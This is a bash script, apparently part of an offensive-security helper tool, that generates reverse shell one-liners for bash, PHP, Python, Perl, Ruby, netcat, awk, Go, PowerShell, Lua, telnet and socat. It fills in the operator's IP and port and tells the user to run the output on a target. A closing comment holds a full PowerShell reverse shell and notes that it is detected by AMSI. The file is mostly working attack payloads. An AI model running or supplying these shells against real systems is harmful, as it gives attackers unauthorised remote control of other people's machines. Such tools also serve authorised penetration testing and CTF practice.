## rev(shell) [type] [port]^: Reverse shell generator (bash, php, python, perl, ...)
# revshell help
if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy revshell [type] [port]"
  echo -e "\nAvailable revshells:"
  SHELLS="bash php pyton2|py2 python|python3|py|py3 perl ruby nc|ncat|netcat awk go ps|psh|pwsh|powershell lua telnet socat"
  IFS=" "
  for i in $SHELLS; do
    echo "[+] $i"
  done | sort
  echo -e "\n[i] Checkout for more: https://book.hacktricks.xyz/shells/shells/linux\n"
  exit
fi

# revshell help
if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -ge 2 ]; then
  PORT="9001"
  if [ "$#" -ge 3 ]; then
    PORT="$3"
  fi

  echo -e "> Run this on your target:\n"
  TYPE="$2"
  case "$TYPE" in
    "bash")                         echo "bash -i >& /dev/tcp/$(getIP)/$PORT 0>&1" ;;
    "php")                          echo "php -r '\$s=fsockopen(\"$(getIP)\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
    "python2"|"py2")                echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$(getIP)\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;;
    "python"|"python3"|"py"|"py3")  echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$(getIP)\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;;
    "perl")                         echo "perl -e 'use Socket;\$i="\"$(getIP)\"";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
    "ruby")                         echo "ruby -rsocket -e'f=TCPSocket.open(\"$(getIP)\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" ;;
    "nc"|"ncat"|"netcat")           echo "nc -e /bin/sh $(getIP) $PORT" ;;
    "awk")                          echo -e "[*] WARNING: This shell is NOT upgradeable!\n"; echo "awk 'BEGIN {s=\"/inet/tcp/0/$(getIP)/$PORT\";while(42){do{printf \"shell> \"|& s;s|& getline c; if(c){while((c|& getline)>0) print \$0|& s;close(c);}} while(c!=\"exit\") close(s);}}' /dev/null" ;;
    "go"|"golang")                  echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$(getIP):$PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" ;;
    "ps"|"psh"|"powershell"|"pwsh") echo "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"\$a=New-Object System.Net.Sockets.TCPClient('$(getIP)',$PORT);\$b=\$a.GetStream();[byte[]]\$d=0..65535|%{0};while((\$e=\$b.Read(\$d,0,\$d.Length)) -ne 0){;\$i=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$d,0,\$e);\$k=(iex \$i 2>&1|Out-String);\$m=\$k+'PS '+(pwd).Path+'> ';\$o=([text.encoding]::ASCII).GetBytes(\$m);\$b.Write(\$o,0,\$o.Length);\$b.Flush()};\$a.Close()\"" ;;
    "lua")                          echo -e "# Linux (tested with lua5.3):\nlua -e \"require('os');s=require('socket');s.tcp();s.connect('$(getIP)','$PORT');os.execute('/bin/sh -i <&3 >&3 2>&3')" ;;
    "telnet")                       echo "rm -f /tmp/p; mknod /tmp/p p && telnet $(getIP) $PORT 0/tmp/p" ;;
    "socat")                        echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT" ;;
    *)                              echo "[!] Unknown revshell type!" ;;
  esac
  echo
  exit
fi
# 2DO:
# - ruby revshell doesn't work somehow
# - psh flagged by AMSI :/
# $a = New-Object System.Net.Sockets.TCPClient('127.0.0.1',30033);$b = $a.GetStream();[byte[]]$c = 0..65535|%{0};while(($i = $b.Read($c, 0, $c.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $i);$e = (iex $d 2>&1 | Out-String );$f  = $e + "PS> ";$g = ([text.encoding]::ASCII).GetBytes($f);$b.Write($g,0,$g.Length);$b.Flush()};$a.Close()
